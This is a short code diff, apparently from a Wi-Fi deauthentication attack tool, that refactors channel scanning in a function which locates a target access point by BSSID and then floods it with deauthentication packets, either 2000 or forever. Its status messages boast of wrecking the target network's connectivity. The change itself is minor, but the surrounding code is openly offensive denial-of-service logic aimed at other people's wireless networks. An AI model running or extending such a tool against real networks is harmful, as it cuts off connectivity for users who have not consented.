@@ -46,9 +46,7 @@ def deauthenticate(arguments):
             # Get the dataframe created by the call back
             networks = getDF()
             # increase the channel
-            # Used to keep the channel below 14
-            scan_channel = (scan_channel %14)+1
-            my_interface.change_channel(scan_channel)
+            my_interface.increment_channel()
         
         # Once the AP mac address is found get the channel
         channel_for_deauth = networks.loc[arguments.bssid, "Channel"]
@@ -68,7 +66,6 @@ def deauthenticate(arguments):
             print_update(f"[+] Sending Packets Forever!!! Screw the WIFI connectivity to: {networks.loc[arguments.bssid, 'SSID']}!!!")
             deauth(my_interface.name, 
                     arguments.bssid, 
-                    
                     forever=True)
         else:
             print_update(f"[+] Sending 2000 Packets!!! Screw the WIFI connectivity to: {networks.loc[arguments.bssid, 'SSID']}!!!")
